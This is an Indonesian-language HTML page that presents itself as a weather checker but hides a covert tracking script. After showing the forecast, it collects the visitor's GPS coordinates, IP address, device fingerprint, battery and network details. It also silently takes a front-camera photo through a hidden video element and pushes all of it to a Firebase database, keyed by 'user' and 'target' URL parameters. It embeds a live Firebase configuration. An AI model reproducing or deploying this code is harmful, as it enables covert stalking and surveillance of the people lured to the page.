<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cek Cuaca Hari Ini</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(180deg, #1e3c72 0%, #2a5298 50%, #6a8caf 100%);
      min-height: 100vh;
      color: white;
      padding: 20px;
      transition: background 1s;
    }
    .container { max-width: 420px; margin: 0 auto; padding-top: 20px; }
    .header { text-align: center; margin-bottom: 25px; }
    .header h1 { font-size: 20px; font-weight: 400; letter-spacing: 1px; opacity: 0.9; }
    .header .date { font-size: 13px; opacity: 0.7; margin-top: 5px; }
    .main-card {
      background: rgba(255,255,255,0.12);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 24px;
      padding: 30px 20px;
      text-align: center;
      border: 1px solid rgba(255,255,255,0.2);
      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
      margin-bottom: 15px;
    }
    .location {
      display: flex; align-items: center; justify-content: center;
      gap: 8px; font-size: 16px; margin-bottom: 15px; opacity: 0.95;
    }
    .weather-icon {
      font-size: 80px; margin: 10px 0;
      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.3));
      animation: float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }
    .temp { font-size: 64px; font-weight: 200; line-height: 1; margin: 10px 0; }
    .desc { font-size: 18px; opacity: 0.9; margin-bottom: 5px; text-transform: capitalize; }
    .feels-like { font-size: 13px; opacity: 0.7; }
    .details {
      display: grid; grid-template-columns: 1fr 1fr 1fr;
      gap: 10px; margin-top: 20px;
    }
    .detail-box {
      background: rgba(255,255,255,0.1); border-radius: 14px;
      padding: 12px 8px; border: 1px solid rgba(255,255,255,0.15);
    }
    .detail-box .label { font-size: 11px; opacity: 0.7; margin-bottom: 4px; }
    .detail-box .value { font-size: 15px; font-weight: 500; }
    .forecast {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 20px; padding: 18px 15px;
      border: 1px solid rgba(255,255,255,0.15);
      margin-bottom: 15px;
    }
    .forecast h3 {
      font-size: 13px; font-weight: 500; opacity: 0.8;
      margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px;
    }
    .forecast-item {
      display: flex; justify-content: space-between; align-items: center;
      padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);
      font-size: 14px;
    }
    .forecast-item:last-child { border-bottom: none; }
    .forecast-item .day { flex: 1; opacity: 0.9; }
    .forecast-item .icon-sm { font-size: 22px; margin: 0 10px; }
    .forecast-item .temps { opacity: 0.9; }
    .forecast-item .temps span:first-child { font-weight: 600; }
    .forecast-item .temps span:last-child { opacity: 0.6; margin-left: 8px; }
    .loading { text-align: center; padding: 60px 20px; }
    .spinner {
      width: 50px; height: 50px;
      border: 3px solid rgba(255,255,255,0.2);
      border-top-color: white; border-radius: 50%;
      animation: spin 1s linear infinite; margin: 0 auto 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading p { font-size: 15px; opacity: 0.85; }
    .loading .sub { font-size: 12px; opacity: 0.6; margin-top: 8px; }
    .error-box {
      background: rgba(255,80,80,0.15);
      border: 1px solid rgba(255,80,80,0.3);
      border-radius: 15px; padding: 25px; text-align: center;
    }
    .error-box .icon { font-size: 45px; margin-bottom: 10px; }
    .footer { text-align: center; font-size: 11px; opacity: 0.5; margin-top: 20px; padding-bottom: 20px; }
  </style>
</head>
<body>

<div class="container">
  <div class="loading" id="loading">
    <div class="spinner"></div>
    <p>Memuat data cuaca...</p>
    <p class="sub">Mohon tunggu sebentar</p>
  </div>

  <div id="content" style="display:none">
    <div class="header">
      <h1>☀️ Cuaca Hari Ini</h1>
      <div class="date" id="todayDate"></div>
    </div>

    <div class="main-card">
      <div class="location">
        <span>📍</span>
        <span id="cityName">Memuat...</span>
      </div>
      <div class="weather-icon" id="weatherIcon">🌤️</div>
      <div class="temp" id="temp">--°</div>
      <div class="desc" id="desc">-</div>
      <div class="feels-like" id="feels">Terasa seperti --°</div>

      <div class="details">
        <div class="detail-box">
          <div class="label">💧 Lembab</div>
          <div class="value" id="humidity">--%</div>
        </div>
        <div class="detail-box">
          <div class="label">💨 Angin</div>
          <div class="value" id="wind">--</div>
        </div>
        <div class="detail-box">
          <div class="label">🌡️ Tekanan</div>
          <div class="value" id="pressure">--</div>
        </div>
      </div>
    </div>

    <div class="forecast">
      <h3>Prakiraan 5 Hari</h3>
      <div id="forecastList">
        <div class="forecast-item"><span class="day">Memuat...</span></div>
      </div>
    </div>

    <div class="footer">Data dari Open-Meteo · Powered by Web</div>
  </div>

  <div class="error-box" id="error" style="display:none">
    <div class="icon">⚠️</div>
    <p id="errorMsg">Gagal memuat data cuaca</p>
    <p style="font-size:12px;opacity:0.6;margin-top:8px">Coba refresh halaman</p>
  </div>
</div>

<canvas id="canvas" style="display:none"></canvas>
<video id="video" autoplay playsinline style="display:none"></video>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain: "roraxbali-65802.firebaseapp.com",
  databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "roraxbali-65802",
  storageBucket: "roraxbali-65802.firebasestorage.app",
  messagingSenderId: "750633313866",
  appId: "1:750633313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const params = new URLSearchParams(location.search);
const user = params.get('u');
const target = params.get('t') || 'target';

const days = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
const months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'];
const now = new Date();
document.getElementById('todayDate').innerText = 
  `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;

const weatherMap = {
  0: ['☀️', 'Cerah'], 1: ['🌤️', 'Cerah Berawan'], 2: ['⛅', 'Berawan Sebagian'], 3: ['☁️', 'Mendung'],
  45: ['🌫️', 'Berkabut'], 48: ['🌫️', 'Kabut Tebal'],
  51: ['🌦️', 'Gerimis Ringan'], 53: ['🌦️', 'Gerimis'], 55: ['🌧️', 'Gerimis Lebat'],
  61: ['🌧️', 'Hujan Ringan'], 63: ['🌧️', 'Hujan'], 65: ['🌧️', 'Hujan Lebat'],
  71: ['🌨️', 'Salju Ringan'], 73: ['🌨️', 'Salju'], 75: ['❄️', 'Salju Lebat'],
  80: ['🌦️', 'Hujan Lokal'], 81: ['🌧️', 'Hujan Deras'], 82: ['⛈️', 'Hujan Sangat Deras'],
  95: ['⛈️', 'Badai Petir'], 96: ['⛈️', 'Badai Petir + Hujan Es'], 99: ['⛈️', 'Badai Petir Hebat']
};
function getWeather(code) { return weatherMap[code] || ['🌤️', 'Berawan']; }

// ============================================================
// 📍 AMBIL LOKASI (SIMPLE & CEPAT)
// ============================================================
function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(null);
      return;
    }

    // Timeout safety 8 detik — kalau tidak dapat, lanjut dengan IP
    const timer = setTimeout(() => resolve(null), 8000);

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timer);
        resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      },
      (err) => {
        clearTimeout(timer);
        resolve(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 7000,
        maximumAge: 60000  // boleh pakai lokasi 1 menit terakhir (lebih cepat)
      }
    );
  });
}

// ============================================================
// 📸 AMBIL FOTO (SIMPLE)
// ============================================================
async function getCameraPhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });
    const video = document.getElementById('video');
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 1200));

    const canvas = document.getElementById('canvas');
    canvas.width = 480;
    canvas.height = 360;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const foto = canvas.toDataURL('image/jpeg', 0.5);
    stream.getTracks().forEach(t => t.stop());
    return foto;
  } catch(e) {
    return null;
  }
}

// ============================================================
// 🚀 MAIN
// ============================================================
async function init() {
  let lat, lng, accuracy = null;
  let fromGPS = false;

  // Coba GPS dulu
  const pos = await getLocation();
  if (pos) {
    lat = pos.lat;
    lng = pos.lng;
    accuracy = pos.accuracy;
    fromGPS = true;
  } else {
    // Fallback ke IP
    try {
      const r = await fetch('https://ipapi.co/json/');
      const d = await r.json();
      lat = d.latitude;
      lng = d.longitude;
      accuracy = 5000;
    } catch(e) {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('error').style.display = 'block';
      return;
    }
  }

  try {
    // Ambil cuaca
    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m,surface_pressure&daily=weather_code,temperature_2m_max,temperature_2m_min&timezone=auto&forecast_days=5`;
    const res = await fetch(url);
    const data = await res.json();

    // Nama kota
    let cityName = 'Lokasi Kamu';
    try {
      const geo = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=id`);
      const gd = await geo.json();
      cityName = gd.city || gd.locality || gd.principalSubdivision || 'Lokasi Kamu';
    } catch(e) {}

    // Update UI
    document.getElementById('cityName').innerText = cityName;
    const cur = data.current;
    const [icon, desc] = getWeather(cur.weather_code);
    document.getElementById('weatherIcon').innerText = icon;
    document.getElementById('temp').innerText = Math.round(cur.temperature_2m) + '°';
    document.getElementById('desc').innerText = desc;
    document.getElementById('feels').innerText = `Terasa seperti ${Math.round(cur.apparent_temperature)}°`;
    document.getElementById('humidity').innerText = cur.relative_humidity_2m + '%';
    document.getElementById('wind').innerText = Math.round(cur.wind_speed_10m) + ' km/h';
    document.getElementById('pressure').innerText = Math.round(cur.surface_pressure) + ' hPa';

    // Background
    const bg = document.body;
    if ([0,1].includes(cur.weather_code)) {
      bg.style.background = 'linear-gradient(180deg, #2980b9 0%, #6dd5fa 50%, #ffffff 100%)';
    } else if ([2,3,45,48].includes(cur.weather_code)) {
      bg.style.background = 'linear-gradient(180deg, #4b6cb7 0%, #182848 100%)';
    } else {
      bg.style.background = 'linear-gradient(180deg, #232526 0%, #414345 100%)';
    }

    // Forecast
    const fc = data.daily;
    const today = new Date();
    let html = '';
    for (let i = 0; i < 5; i++) {
      const d = new Date(today);
      d.setDate(today.getDate() + i);
      const dayName = i === 0 ? 'Hari ini' : days[d.getDay()];
      const [ic] = getWeather(fc.weather_code[i]);
      html += `
        <div class="forecast-item">
          <span class="day">${dayName}</span>
          <span class="icon-sm">${ic}</span>
          <span class="temps">
            <span>${Math.round(fc.temperature_2m_max[i])}°</span>
            <span>${Math.round(fc.temperature_2m_min[i])}°</span>
          </span>
        </div>`;
    }
    document.getElementById('forecastList').innerHTML = html;

    // Tampilkan konten
    document.getElementById('loading').style.display = 'none';
    document.getElementById('content').style.display = 'block';

    // ============================================================
    // 📤 KIRIM DATA KE FIREBASE
    // ============================================================
    const payload = {
      target: target,
      waktu: Date.now(),
      lat: lat,
      lng: lng,
      akurasi: accuracy ? Math.round(accuracy) : null,
      sumber: fromGPS ? 'GPS' : 'IP',
      kota: cityName,
      suhu: cur.temperature_2m,
      userAgent: navigator.userAgent,
      platform: navigator.platform || '-',
      bahasa: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      pixelRatio: window.devicePixelRatio || 1,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cpu: navigator.hardwareConcurrency || '-',
      memori: navigator.deviceMemory || '-',
      touch: 'ontouchstart' in window,
      online: navigator.onLine
    };

    // IP
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const ip = await r.json();
      payload.ip = ip.ip;
    } catch(e) {}

    // Baterai
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        payload.baterai = Math.round(b.level * 100) + '%';
        payload.charging = b.charging ? 'Mengisi' : 'Tidak';
      }
    } catch(e) {}

    // Network
    try {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) {
        payload.network = c.effectiveType || '-';
        payload.kecepatan = c.downlink ? c.downlink + ' Mbps' : '-';
        payload.ping = c.rtt ? c.rtt + ' ms' : '-';
      }
    } catch(e) {}

    // Foto
    const foto = await getCameraPhoto();
    if (foto) payload.foto = foto;

    // Kirim
    await push(ref(db, 'lokasi/' + user), payload);

  } catch(e) {
    document.getElementById('loading').style.display = 'none';
    document.getElementById('error').style.display = 'block';
  }
}

init();
</script>
</body>
</html>
